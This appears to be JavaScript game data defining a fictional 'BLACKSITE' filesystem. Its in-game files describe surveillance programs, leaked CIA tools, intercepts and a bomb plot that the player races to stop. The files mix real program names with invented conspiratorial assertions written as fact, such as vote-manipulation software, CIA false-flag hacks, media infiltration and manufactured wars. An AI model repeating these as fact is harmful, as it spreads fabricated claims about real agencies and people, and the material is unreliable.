  /consortium   - THE CONSORTIUM - Corporate shadow network

All access is logged. All searches are recorded.
There is no anonymity here. Only truth.

"In the age of information, ignorance is a choice."

[SYSTEM] Current active operation: MERIDIAN DEFUSAL
[SYSTEM] Analyst clearance: LEVEL 4 - UNRESTRICTED READ`
                },

                // ─────────────────────────────────────────────────────────
                // /blacksite/classified - Black Programs & Surveillance
                // ─────────────────────────────────────────────────────────

                '/blacksite/classified': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['PRISM-II.txt', 'ECHELON-NEXT.txt', 'CARNIVORE-3.txt', 'STELLAR-WIND.txt', 'MYSTIC.txt', 'BOUNDLESS-INFORMANT.log', 'XKEYSCORE-queries.log', 'domestic-surveillance.txt']
                },

                '/blacksite/classified/PRISM-II.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `TOP SECRET//SI//ORCON//NOFORN
PROGRAM: PRISM-II (Successor to PRISM)
STATUS: ACTIVE
INCEPTION: 2019-03-15

OVERVIEW:
PRISM-II extends collection capabilities beyond the original nine
providers. Following the 2013 disclosures, participating companies
developed "clean room" architectures that provide plausible deniability
while maintaining full collection access.

PARTICIPATING ENTITIES (Codenames):
  FAIRVIEW    - [REDACTED] Telecom (fiber taps, 47 POPs)
  STORMBREW   - [REDACTED] Cable (undersea cable access)
  BLARNEY     - [REDACTED] Tech (cloud infrastructure)
  OAKSTAR     - [REDACTED] Social (metadata + content)
  LITHIUM     - [REDACTED] Mobile (device telemetry)

COLLECTION TYPES:
  - Email content and metadata
  - Chat/IM logs (real-time)
  - Video/voice calls
  - Social network data
  - Cloud storage contents
  - Search history
  - Device location (continuous)
  - Biometric data (facial, voice, gait)

LEGAL FRAMEWORK:
Section 702 renewal + Executive Order 12333 (as amended)
No warrant required for "incidental" collection of US persons

DAILY VOLUME: 2.7 billion records
STORAGE: Utah Data Center (Facility 2)

[EYES ONLY] Note: Public PRISM was the cover story.
PRISM-II is the real program. They never stopped. They expanded.`
                },

                '/blacksite/classified/ECHELON-NEXT.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `TOP SECRET//COMINT//FVEY
PROGRAM: ECHELON-NEXT (Five Eyes Modernization)
STATUS: OPERATIONAL
CODENAME VARIANTS: TEMPORA (UK), STATEROOM (AU), FRENCHELON (FR-adjacent)

NETWORK TOPOLOGY:
The original ECHELON satellite intercept network has been modernized
to focus on fiber-optic and undersea cable interception.

PRIMARY COLLECTION POINTS:
  - Bude, Cornwall (GCHQ) - Transatlantic cables
  - Djibouti (NSA/CIA) - SEA-ME-WE 4 & 5
  - Singapore (GCHQ/ASD) - Asia-Pacific hub
  - Pine Gap, Australia (NSA/ASD) - Satellite backup
  - Yakima, Washington (NSA) - Pacific Rim

FIVE EYES DATA SHARING:
Under UKUSA agreement, raw intelligence is shared within 72 hours.
Each partner nation can query the others' databases directly.

LOOPHOLE: NSA cannot spy on Americans. GCHQ can.
GCHQ cannot spy on Brits. NSA can.
Data is exchanged. Everyone is watched. No laws are broken.

KEYWORD TRIGGERS (Current Quarter):
  bomb, assassination, crypto, VPN, Tor, protest, organize,
  whistleblow, leak, journalist, encryption, privacy, rights

DAILY INTERCEPTS: 890 million communications
FALSE POSITIVE RATE: 94.7%
ACTIONABLE INTELLIGENCE: 0.3%

But that 0.3% is everything.`
                },

                '/blacksite/classified/CARNIVORE-3.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `SECRET//NOFORN
PROGRAM: CARNIVORE-3 (Deep Packet Inspection - Gen 3)
PREDECESSOR: DCS1000 (Carnivore), NarusInsight
STATUS: DEPLOYED AT 847 ISP NODES

CAPABILITY SUMMARY:
Unlike its predecessors, CARNIVORE-3 is not a "black box" installed
at ISP premises. It is integrated directly into router firmware
through "security partnerships" with manufacturers.

AFFECTED VENDORS:
  [REDACTED] - 73% market share, firmware backdoor since 2016
  [REDACTED] - 12% market share, hardware implant in ASICs
  [REDACTED] - 8% market share, voluntary cooperation

COLLECTION SCOPE:
  Full packet capture (not just headers)
  SSL/TLS interception via compromised CA certs
  VPN tunnel inspection (certain providers)
  Tor exit node monitoring (we run 23% of exit nodes)

INTEGRATION WITH:
  - XKEYSCORE (query interface)
  - MARINA (metadata database)
  - MAINWAY (call records)
  - NUCLEON (voice content)

LEGAL NOTE:
Program operates under EO 12333. No FISA court oversight.
"Incidental" collection of domestic traffic is not illegal
if the "target" is foreign.

Everyone talks to foreigners. Everyone is incidentally collected.
The distinction is meaningless by design.`
                },

                '/blacksite/classified/STELLAR-WIND.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `TOP SECRET//STLW//HCS
PROGRAM: STELLAR WIND (Continued)
STATUS: RENAMED AND RESTRUCTURED, NEVER TERMINATED
CURRENT DESIGNATION: [CLASSIFIED]

HISTORY:
Public narrative: STELLAR WIND was "ended" in 2007.
Reality: The program was divided into four compartments and continued
under new codenames with slight procedural modifications.

COMPONENT PROGRAMS:
  1. MAINWAY - Ongoing call detail record collection
  2. MARINA - Internet metadata (currently 14 trillion records)
  3. NUCLEON - Voice content capture and transcription
  4. [REDACTED] - Financial transaction monitoring

POST-2013 MODIFICATIONS:
After Snowden disclosures, collection "technically" moved offshore.
Data is collected by partner agencies (GCHQ, BND, DGSE) and shared
back under intelligence liaison agreements.

Same data. Different legal jurisdiction. Problem solved.

OVERSIGHT:
  - FISA Court (rubber stamp: 99.97% approval rate)
  - Congressional Gang of Eight (sworn to secrecy)
  - Internal compliance (we investigate ourselves)

2019 REVELATION:
Program briefly suspended after "technical irregularities" exposed.
Translation: We were caught collecting domestic data directly.
Solution: Blamed a contractor. Program resumed in 60 days.

The surveillance state doesn't end. It adapts.`
                },

                '/blacksite/classified/MYSTIC.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `TOP SECRET//SI//ORCON
PROGRAM: MYSTIC / SOMALGET
STATUS: ACTIVE IN 7 COUNTRIES (expanded from original 5)

CAPABILITY:
Full-take recording of ALL telephone calls in target countries.
Not metadata. Not samples. EVERY CALL. EVERY WORD.

SOMALGET (Sub-program):
30-day rolling buffer of all voice communications.
"Time machine" capability - retroactively listen to any call.

CONFIRMED TARGET COUNTRIES:
  - Bahamas (2009-present)
  - Afghanistan (2011-present)
  - [REDACTED] - European ally
  - [REDACTED] - Middle East ally
  - [REDACTED] - Latin American country
  - [REDACTED] - (added 2022)
  - [REDACTED] - (added 2023)

COLLECTION METHOD:
DEA provides cover. "Drug Enforcement" cooperation agreements
give legal access to telecommunications infrastructure.
NSA does the actual collection. DEA gets credit for "tips."

LEGAL FRAMEWORK:
Target countries are unaware of true scope.
Local "cooperation" is obtained through coercion or deception.
US persons calling these countries are "incidentally" collected.

STORAGE: 780 petabytes (rolling 30-day buffer)
TRANSCRIPTION: Automated, 94 languages, 87% accuracy
KEYWORD ALERTS: 47,000 active triggers

When they said they could listen to everything...
They meant it literally.`
                },

                '/blacksite/classified/BOUNDLESS-INFORMANT.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `BOUNDLESS INFORMANT - Collection Statistics
Last Updated: 2024-01-15 00:00:00 UTC

GLOBAL COLLECTION (30-day rolling window):
══════════════════════════════════════════════════════════════
Country         DNR Records    DNI Records    Total
──────────────────────────────────────────────────────────────
United States   2,892,000,000  3,100,000,000  5,992,000,000
Germany           552,000,000    487,000,000  1,039,000,000
Brazil            389,000,000    298,000,000    687,000,000
France            298,000,000    276,000,000    574,000,000
United Kingdom    227,000,000    198,000,000    425,000,000
India             198,000,000    156,000,000    354,000,000
[Additional 189 countries truncated]
──────────────────────────────────────────────────────────────
MONTHLY TOTAL:                               97,120,000,000

DNR = Dialed Number Recognition (phone metadata)
DNI = Digital Network Intelligence (internet metadata)

NOTE: United States collection includes:
  - Foreign communications transiting US infrastructure
  - "Incidental" collection of US persons
  - Section 702 "about" collection (officially discontinued 2017)
  - Contractor and partner agency submissions

The American public was told collection was "targeted."
These numbers tell a different story.

[SYSTEM] Warning: This data contradicts public testimony.
[SYSTEM] Disclosure would constitute unauthorized release.`
                },

                '/blacksite/classified/XKEYSCORE-queries.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `XKEYSCORE Query Log - Sample Export
Classification: TS//SI//REL TO USA, FVEY

[2024-01-14 14:23:17] Analyst: [REDACTED]@nsa.gov
  Query: email.from:(*@protonmail.com OR *@tutanota.com)
  Justification: "Encrypted email providers used by targets"
  Results: 2,847,293 records

[2024-01-14 14:45:02] Analyst: [REDACTED]@nsa.gov
  Query: http.url:*torproject* OR http.url:*tails*
  Justification: "Anonymization tool research"
  Results: 892,445 records

[2024-01-14 15:12:33] Analyst: [REDACTED]@nsa.gov
  Query: content:"VPN" AND geo.country:US
  Justification: "Domestic VPN usage patterns"
  Results: 12,445,827 records

[2024-01-14 16:02:18] Analyst: [REDACTED]@nsa.gov
  Query: phone.metadata WHERE contact_graph INCLUDES journalist
  Justification: "Source identification"
  Results: 47,223 records
  [FLAGGED: Potential press contact surveillance]

[2024-01-14 17:44:09] Analyst: [REDACTED]@nsa.gov
  Query: user.name:* AND search.history:*protest*
  Justification: "Event security support"
  Results: 298,445 records

No warrant was required for any of these queries.
XKEYSCORE operates on the principle of "collect it all, sort it later."

As one training document stated:
"Nearly everything a typical user does on the internet can be captured."`
                },

                '/blacksite/classified/domestic-surveillance.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `MEMORANDUM - INTERNAL USE ONLY
SUBJECT: Domestic Collection Authorities - Clarification

The following guidance addresses common questions about domestic
collection limits:

Q: Can we collect on US persons without a warrant?
A: Not directly. However:
   - "Incidental" collection during foreign targeting is permitted
   - Communications that "transit" foreign infrastructure are foreign
   - Partner agencies (GCHQ, BND) have no such restrictions
   - Contractors operating offshore follow offshore rules

Q: What about the Fourth Amendment?
A: The Third Party Doctrine (Smith v. Maryland, 1979) established
   that information shared with third parties has no expectation
   of privacy. In the digital age, everything is shared with
   third parties (ISPs, email providers, cloud services).
   Therefore, effectively nothing is protected.

Q: Are there any meaningful restrictions?
A: Collection on US persons requires documentation of:
   - Foreign intelligence purpose (broadly defined)
   - Reasonable belief of foreign connection (one email counts)
   - Proper selector justification (can be retroactive)

PRACTICAL EFFECT:
If an American emails, calls, or messages anyone outside the US,
or uses any service that routes through foreign infrastructure,
they can be collected. Given internet routing, this means everyone.

Legal? Technically yes.
What the public expects? No.

This document does not exist. This guidance was never given.`
                },

                // ─────────────────────────────────────────────────────────
                // /blacksite/leaks - Whistleblower Documents
                // ─────────────────────────────────────────────────────────

                '/blacksite/leaks': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['SNOWDEN-archive', 'VAULT7', 'panama-papers', 'corporate-dumps', 'pentagon-papers-ii.txt', 'WHISTLEBLOWER-001.txt']
                },

                '/blacksite/leaks/SNOWDEN-archive': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['README.txt', 'unreleased-001.txt', 'unreleased-002.txt', 'media-blacklist.txt']
                },

                '/blacksite/leaks/SNOWDEN-archive/README.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `SNOWDEN ARCHIVE - BLACKSITE MIRROR
Total Documents: 1.7 million
Released to Media: ~9,000 (0.5%)
Withheld by Journalists: ~200,000 (11.7%)
Never Released: ~1.5 million (87.8%)

This archive contains documents that were never published.
The journalists who received the archive made editorial decisions
about what the public "needed to know."

They decided you didn't need to know about:
  - Domestic assassination programs
  - Election interference capabilities (US on allies)
  - Financial system backdoors
  - Nuclear facility vulnerabilities
  - Agreements with tech executives (not companies - individuals)

The released documents were the palatable ones.
The ones that made you uncomfortable but didn't collapse society.

The ones in this archive are different.

Access requires Level 5 clearance. You have Level 4.
Some doors remain closed.`
                },

                '/blacksite/leaks/SNOWDEN-archive/unreleased-001.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `[DOCUMENT RECOVERED FROM UNRELEASED CACHE]
Classification: TOP SECRET//ORCON//NOFORN
Date: 2012-07-14
Subject: OPERATION MOCKINGBIRD (Modernized)

The original Operation Mockingbird (1950s-1970s) placed CIA assets
in major news organizations. The Church Committee "ended" this.

The modern equivalent is more sophisticated:

TIER 1 - DIRECT PLACEMENT (14 individuals)
  Assets placed in editorial positions at major outlets.
  Receive monthly stipends through cutout foundations.
  Have kill authority on certain stories.

TIER 2 - FRIENDLY CONTACTS (200+ individuals)
  Journalists who cooperate voluntarily for access.
  Receive "exclusive" intelligence in exchange for favorable coverage.
  Not technically employed, maintains deniability.

TIER 3 - INFLUENCED OUTLETS (list redacted)
  Publications funded through intermediary foundations.
  Editorial direction provided through board members.
  Appear independent but follow guidance.

CURRENT INITIATIVES:
  - Narrative control around surveillance disclosures
  - Managed opposition (release limited truths to control narrative)
  - Discrediting of unapproved journalists
  - Social media influence operations (domestic)

The First Amendment protects the press.
It does not prevent the press from volunteering.

[DOCUMENT PARTIALLY REDACTED - NAMES WITHHELD]`
                },

                '/blacksite/leaks/SNOWDEN-archive/unreleased-002.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `[DOCUMENT RECOVERED FROM UNRELEASED CACHE]
Classification: TOP SECRET//SAP//WAIVED
Date: 2011-03-22
Subject: HAMMER/SCORECARD - Electoral Oversight

NOTE: This document's authenticity is disputed.
It was never publicly released for "national security" reasons.

PROGRAM OVERVIEW:
HAMMER is a supercomputer system designed to access protected
networks without detection. SCORECARD is a vote manipulation
application that runs on HAMMER.

ALLEGED CAPABILITIES:
  - Access to electronic voting systems
  - Vote tally modification at tabulation points
  - Audit log manipulation
  - Real-time adjustment based on monitoring

DOCUMENTED USES:
  [REDACTED] election 2012 - "Calibration exercise"
  [REDACTED] primary 2016 - "Observation mode"
  [REDACTED] [REDACTED] [REDACTED]

CURRENT STATUS: [REDACTED]

DISSENT NOTE (Appended by unknown analyst):
"I accessed this file because I took an oath to the Constitution,
not to any administration. If this program exists and has been used
domestically, it represents the end of democratic legitimacy.

I don't know if this is real or disinformation designed to
discredit legitimate concerns. That's the genius of it.
We can't tell the difference anymore."

[END DOCUMENT]`
                },

                '/blacksite/leaks/SNOWDEN-archive/media-blacklist.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `MEDIA COORDINATION - INTERDICTION LIST
Updated: 2024-01-10

The following journalists and outlets are flagged for enhanced
monitoring and source interdiction:

TIER 1 - ACTIVE INTERDICTION
  [Names withheld - operational security]
  Status: Sources identified and neutralized
  Method: Legal pressure, source prosecution, device compromise

TIER 2 - PASSIVE MONITORING
  All communications captured and analyzed
  Sources tracked through metadata analysis
  No direct action unless threshold crossed

TIER 3 - DISCREDITING CANDIDATES
  Journalists who may receive future leaks
  Preemptive reputation research compiled
  Social media history archived for potential use

OUTLET STATUS:
  [REDACTED] - Compromised, safe for managed leaks
  [REDACTED] - Hostile, full monitoring authorized
  [REDACTED] - Cooperative, preferred for authorized disclosures
  [REDACTED] - Independent, enhanced source tracking

LEGAL FRAMEWORK:
Espionage Act prosecutions for sources
No journalist has been directly prosecuted (yet)
Strategy: Create chilling effect through source targeting

"A free press exists only if we allow it to."
  - Internal briefing, 2019`
                },

                '/blacksite/leaks/VAULT7': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['weeping-angel.txt', 'marble-framework.txt', 'umbrage.txt', 'hive.txt']
                },

                '/blacksite/leaks/VAULT7/weeping-angel.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `CIA/MI5 JOINT OPERATION: WEEPING ANGEL
Target: Samsung Smart TVs (F8000 series and successors)
Status: DEPLOYED (estimated 14 million compromised devices)

CAPABILITY:
While TV appears to be off (fake-off mode), the implant:
  - Records audio via built-in microphone
  - Can enable camera on equipped models
  - Exfiltrates via WiFi when TV "wakes"
  - Survives firmware updates (persistence)

DEPLOYMENT METHODS:
  - USB installation (requires physical access)
  - WiFi injection (later versions)
  - Supply chain interdiction (pre-installed)

TARGET SELECTION:
Originally developed for high-value targets.
Mass deployment authorized 2018 under [REDACTED] finding.

COLLECTION SCOPE:
  - Living room conversations
  - Meeting rooms (hotels, offices)
  - Bedrooms (models with cameras)

LEGAL AUTHORITY:
Overseas deployment: Executive Order 12333
Domestic deployment: [AUTHORITY DISPUTED]

Samsung was not informed. Customers were not informed.
Your TV is not watching you. It's listening.

[Developed in cooperation with MI5 - UK handles UK targets]`
                },

                '/blacksite/leaks/VAULT7/marble-framework.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `PROJECT: MARBLE FRAMEWORK
Classification: SECRET//NOFORN
Purpose: Forensic Attribution Obfuscation

OVERVIEW:
Marble is designed to allow the CIA to conduct cyber operations
that cannot be attributed to the United States, and can be
deliberately attributed to other nations.

CAPABILITIES:
  - Code obfuscation to hide American fingerprints
  - Insertion of foreign language strings (Russian, Chinese,
    Arabic, Korean, Farsi) into malware
  - Mimicry of known foreign threat actor techniques
  - Timestamp manipulation to fake origin timezone

DOCUMENTED FALSE FLAGS:
  [REDACTED] 2016 - Attributed to Russia, origin was [REDACTED]
  [REDACTED] 2017 - Attributed to China, origin was [REDACTED]
  [REDACTED] 2018 - Attributed to Iran, origin was [REDACTED]

IMPLICATIONS:
Any cyberattack attributed to a foreign nation-state could
potentially be a CIA operation using Marble.

Forensic analysis showing "Russian" or "Chinese" code strings
is meaningless. We can make anything look like anyone.

PUBLIC NARRATIVE IMPACT:
When a hack is attributed to Russia or China, ask yourself:
  - How certain is the attribution?
  - Who benefits from the narrative?
  - Could Marble have been used?

The answer is usually classified.`
                },

                '/blacksite/leaks/VAULT7/umbrage.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `PROJECT: UMBRAGE
Division: Remote Devices Branch
Purpose: Technique Collection and Repurposing

OVERVIEW:
Umbrage collects and maintains a library of attack techniques
"borrowed" from malware produced by other nations, including Russia.

LIBRARY CONTENTS:
  - Keyloggers attributed to FSB operations
  - File wipers mimicking Shamoon (Iran)
  - Ransomware variants resembling Lazarus Group (DPRK)
  - APT techniques from Chinese units (APT1, APT10, etc.)

USE CASES:
1. Efficiency - Why develop new techniques when others exist?
2. Deniability - Operations can be blamed on technique's "owner"
3. Provocation - Operations can trigger international incidents

DOCUMENTED PROVOCATION OPERATIONS:
  [REDACTED] - Attack designed to appear Russian, target was [REDACTED]
               Purpose: Justify policy response against Russia

  [REDACTED] - Attack designed to appear Iranian, target was [REDACTED]
               Purpose: Support military authorization

THE ATTRIBUTION PROBLEM:
In cybersecurity, attribution is nearly impossible to verify.
The public and policymakers accept attribution from intelligence
agencies without access to underlying evidence.

We control the evidence. We control the narrative.
"Russia hacked the election" - prove we didn't do it ourselves.
"China hacked our infrastructure" - using whose techniques?

This isn't conspiracy. It's capability.
The question is whether it's been used.`
                },

                '/blacksite/leaks/VAULT7/hive.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `PROJECT: HIVE
Classification: TOP SECRET//NOFORN
Infrastructure: Multi-platform Implant Command & Control

OVERVIEW:
HIVE is the CIA's multi-platform implant control infrastructure.
It manages compromised devices across all operating systems:
  - Windows (all versions since XP)
  - Linux (all major distributions)
  - macOS / iOS
  - Android
  - Solaris
  - MikroTik routers
  - Smart TV platforms
  - IoT devices (custom)

ARCHITECTURE:
Implants communicate through a series of VPSs running as
commercial websites (cover domains). Traffic is hidden in
HTTPS connections that appear to be normal web browsing.

COVER DOMAINS (Sample):
  [Appears to be legitimate news site]
  [Appears to be commercial e-commerce]
  [Appears to be software company]
  [Appears to be medical information]

SCALE:
Active implants: [REDACTED - estimated in millions]
Geographic coverage: 147 countries
Domestic devices: [CLASSIFIED]

SUPPLY CHAIN OPERATIONS:
HIVE implants have been pre-installed through:
  - Interdicted shipments (hardware modification)
  - Compromised software updates
  - Cooperative OEM agreements (voluntary)
  - Mandatory cooperation (involuntary, legal compulsion)

Your device may be running a HIVE implant.
There is no reliable way to detect it.
That's by design.`
                },

                '/blacksite/leaks/pentagon-papers-ii.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `[RECOVERED DOCUMENT - AUTHENTICITY UNVERIFIED]
SUBJECT: Strategic Assessment - Forever Wars

The following represents a summary of internal assessments
never intended for public release:

AFGHANISTAN (2001-2021):
  - Internal assessment showed unwinnable by 2003
  - Decision to continue: Contractor revenue, geopolitical presence
  - Actual cost: $2.3 trillion (public figure: $800 billion)
  - Lives lost: ~175,000 (all parties)
  - Outcome: Predicted accurately in 2002 assessment

IRAQ (2003-2011, 2014-present):
  - WMD intelligence: Known to be unreliable at decision point
  - Actual motivation: Currency/oil, regional restructuring
  - Actual cost: $3.1 trillion (including long-term veteran care)
  - Lives lost: ~300,000+ (all parties)

LIBYA (2011):
  - Humanitarian justification: Manufactured
  - Actual outcome: Predicted chaos used as argument against action
  - Decision made anyway: [Reasons classified]

SYRIA (2011-present):
  - Regime change failure concealed as "ISIS response"
  - Actual policy: Managed chaos, maintain instability
  - Russian intervention: Predicted, not prevented by design

THE PATTERN:
  - Threat is exaggerated or manufactured
  - Public consent is manufactured
  - War is initiated
  - Costs are hidden
  - War continues past any rational objective
  - Contractors profit
  - Intelligence agencies expand
  - War "ends" (or is renamed)
  - Rinse, repeat

This isn't incompetence. It's policy.
The wars aren't meant to be won. They're meant to continue.`
                },

                '/blacksite/leaks/WHISTLEBLOWER-001.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `ANONYMOUS SUBMISSION - RECEIVED 2023-11-14
Verification: Source demonstrated access to classified systems

I've worked in signals intelligence for 17 years. I've seen things
that would terrify the public, but I've also seen things that would
terrify the agencies if the public knew.

What they're afraid of:
1. We're not as competent as we pretend
   - Most "stopped terror attacks" were FBI entrapment
   - Mass surveillance produces mostly noise
   - We regularly miss actual threats while chasing ghosts
   - The 9/11 failures were typical, not exceptional

2. The surveillance is not about terrorism
   - Terrorism justifies the budget
   - Actual use: Economic espionage, political intelligence
   - Tracking journalists, activists, political opponents
   - Building dossiers for potential future use

3. The technology is out of control
   - AI systems we don't fully understand make targeting decisions
   - Contractors have access we'd never give employees
   - Data breaches we never disclose
   - Backdoors we've lost track of

4. There is no oversight
   - Congressional oversight is a joke
   - FISA court approves everything
   - Inspectors general are captured
   - The few who push back are marginalized

I'm not releasing documents because I've seen what happens.
Snowden is in exile. Winner is in prison. Assange was tortured.
I have a family.

This is all I can do. Anonymous. Unverifiable. Probably dismissed.
But someone should know that inside, we know it's wrong.
And we do it anyway.

- Anonymous
  (There are more of us than you'd think)`
                },

                // ─────────────────────────────────────────────────────────
                // /blacksite/intercepts - SIGINT Captures
                // ─────────────────────────────────────────────────────────

                '/blacksite/intercepts': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['diplomatic-cables', 'consortium-comms', 'decoded-transmissions.log', 'cell-tower-dumps', 'financial-intercepts.txt']
                },

                '/blacksite/intercepts/diplomatic-cables': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['embassy-berlin.txt', 'embassy-paris.txt', 'UN-mission.txt']
                },

                '/blacksite/intercepts/diplomatic-cables/embassy-berlin.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `SIGINT PRODUCT - EYES ONLY
SOURCE: Technical collection, German Chancellery
DATE: 2023-08-14 through 2024-01-10
CLASSIFICATION: TOP SECRET//SI//ORCON

INTERCEPT SUMMARY:
Collection on Chancellor's personal device continues despite
2014 assurances that surveillance had ended. Method shifted
from direct device access to network infrastructure monitoring.

KEY FINDINGS:
  - Germany aware of US monitoring, pretends otherwise
  - Bilateral "outrage" in 2014 was theater
  - Secret agreement: Germany allows limited collection in
    exchange for intelligence sharing on German far-right

SELECTED INTERCEPTS:

[2023-09-14 08:23 GMT] Chancellor -> Foreign Minister
"The Americans are listening again. [NSA liaison] practically
admitted it. We'll make a statement but take no action. The
intelligence sharing is too valuable to sacrifice for privacy
theater."

[2023-11-22 14:45 GMT] Foreign Minister -> Chancellor
"Re: Nord Stream investigation. Americans increasingly nervous.
[CIA station chief] asked pointed questions about investigation
status. Recommend we slow-walk findings."

[2023-12-01 09:12 GMT] Chancellor -> Staff
"Prepare statement expressing 'concern' about US surveillance
reports. Coordinate with Washington on timing. Must appear
independent while remaining aligned."

German sovereignty is a polite fiction maintained for domestic audiences.`
                },

                '/blacksite/intercepts/consortium-comms': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['meeting-transcript-001.txt', 'secure-channel-log.txt', 'meridian-planning.txt']
                },

                '/blacksite/intercepts/consortium-comms/meeting-transcript-001.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `[INTERCEPT - ENCRYPTED CHANNEL BROKEN]
Date: 2024-01-08
Participants: GRANITE, OBELISK, CIPHER, VECTOR (Consortium Council)
Location: Signal intercept from private satellite uplink

TRANSCRIPT:

GRANITE: The Meridian operation is on schedule. RAVEN confirmed
placement for the 15th. The summit will not occur.

OBELISK: Collateral estimates?

GRANITE: 47 executives confirmed attending. Building staff
approximately 200. Acceptable losses for the objective.

CIPHER: The insurance positions are in place?

VECTOR: $4.7 trillion in represented market cap. Our short
positions are distributed across 847 shell entities. Untraceable
even to state-level forensics.

OBELISK: And if it fails?

GRANITE: RAVEN is expendable. No link to Consortium survives.
The device cannot be traced. The narrative is prepared -
environmental extremists targeting corporate executives.

CIPHER: What about the BLACKSITE analysts?

GRANITE: They're racing against the clock we set. If they succeed,
we've tested their capabilities. If they fail, we've achieved
our objective. We win regardless.

VECTOR: The beauty of controlled opposition.

[END TRANSCRIPT]

NOTE: This intercept was obtained through ECHELON-NEXT.
The Consortium believes their communications are secure.
They are not. We are inside.`
                },

                '/blacksite/intercepts/consortium-comms/meridian-planning.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `[CONSORTIUM OPERATIONAL PLANNING - INTERCEPTED]
OPERATION: MERIDIAN SUNSET
Status: ACTIVE
Date Intercepted: 2024-01-12

PHASE 1: INFILTRATION (Complete)
  - Asset RAVEN embedded as hotel maintenance (6 months)
  - Building systems access obtained
  - Security patterns documented
  - Extraction routes confirmed

PHASE 2: PREPARATION (Complete)
  - Device components smuggled separately
  - Assembly completed in Room 105
  - Timer synchronized to summit opening
  - [REDACTED] wire protocol configured

PHASE 3: EXECUTION (Active - 0600 UTC Jan 15)
  - Summit begins at 0800 local
  - Device detonates at 0845
  - Structural failure within 3 minutes
  - Fire suppression deliberately disabled

PHASE 4: EXPLOITATION
  - Short positions execute on market open
  - Estimated profit: $2.3 billion
  - Narrative: Eco-terrorism, construction failure, or
    "electrical fire" depending on investigation

CONTINGENCY:
If device is discovered: Remote detonation authorized
If RAVEN is captured: Terminate (assets in local PD)
If BLACKSITE intervenes: Accelerate timeline

ANALYST NOTE:
This is the operation you are racing to stop.
The timer is real. The threat is real.
Focus on the mission. There will be time for
the bigger picture later.

Or there won't be.`
                },

                '/blacksite/intercepts/decoded-transmissions.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `BLACKSITE SIGINT - DECODED TRANSMISSIONS
Automatically decoded by SIGNAL/CIPHER engine
Classification: VARIOUS

[2024-01-14 22:14:33 UTC] NUMBERS STATION - Source: Cuba
Freq: 6.853 MHz | Mode: USB | Duration: 4m22s
"973 973 973 Atencion 58291 47382 10293 47281 39201..."
DECRYPT STATUS: Partial | ASSESSMENT: Active spy communication

[2024-01-14 23:01:17 UTC] COVERT BEACON - Source: Unknown
Freq: Spread spectrum | Type: Burst | Duration: 0.3s
Location: Triangulated to Meridian Hotel, Room 105
ASSESSMENT: Device heartbeat signal | PRIORITY: CRITICAL

[2024-01-15 00:23:45 UTC] ENCRYPTED VOICE - Source: Sat Phone
Participants: RAVEN, UNKNOWN (Consortium handler)
Duration: 47 seconds
"Package is live. Timer confirmed. Extraction complete.
The analysts are slower than expected. Proceed as planned."
DECRYPT STATUS: Full | ASSESSMENT: Operational confirmation

[2024-01-15 01:45:00 UTC] CONSORTIUM CHANNEL 7
Type: Text burst | Encryption: Broken
"RAVEN clear. Device armed. 6 hours to summit.
BLACKSITE is watching but won't make it in time.
Granite sends regards. Glory to the Consortium."

[2024-01-15 02:16:00 UTC] EMERGENCY BEACON - Source: Device
Location: Room 105, Meridian Hotel
Signal type: Tamper alert monitoring
ASSESSMENT: Device is rigged with anti-tamper
NOTE: Cutting wrong wire will trigger immediate detonation

These intercepts are being fed to you in real-time.
You are not alone. But only you can act.`
                },

                '/blacksite/intercepts/financial-intercepts.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `FINANCIAL SIGINT - TREASURY LIAISON
Classification: SECRET//NOFORN

UNUSUAL TRADING ACTIVITY FLAGGED:

[2024-01-10] Massive short positions opened on:
  - Nexus Industries (NASDAQ: NXUS) - $340M notional
  - Kyoto Electronics (TYO: 7890) - ¥28B notional
  - Dresden Manufacturing (FRA: DRM) - €180M notional
  - 44 additional companies [see appendix]

Pattern: All companies have executives confirmed for CEO Summit
Timing: Positions opened 5 days before event
Distribution: 847 separate accounts across 23 jurisdictions
Common factor: All accounts trace to Consortium shell network

HISTORICAL COMPARISON:
  - Pre-9/11 airline shorts: Similar pattern, smaller scale
